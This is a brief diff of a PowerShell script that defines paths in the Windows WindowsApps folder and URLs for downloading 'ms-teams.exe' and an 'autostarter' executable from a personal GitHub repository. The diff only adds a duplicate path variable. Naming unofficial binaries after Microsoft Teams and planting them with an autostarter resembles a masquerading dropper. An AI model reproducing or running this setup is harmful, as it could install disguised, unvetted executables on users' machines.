@@ -1,6 +1,7 @@
 $targetDir = "$env:LOCALAPPDATA\Microsoft\WindowsApps"
 $exePath = "$targetDir\ms-teams.exe"
 $scriptPath = "$targetDir\ms-teams_autostarter.exe"
+$scriptPath2 = "$targetDir\ms-teams_autostarter.exe"
 
 $exeUrl = "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams.exe"
 $ahkUrl = "https://raw.githubusercontent.com/mo-hashad30/wf/main/ms-teams_autostarter.exe"
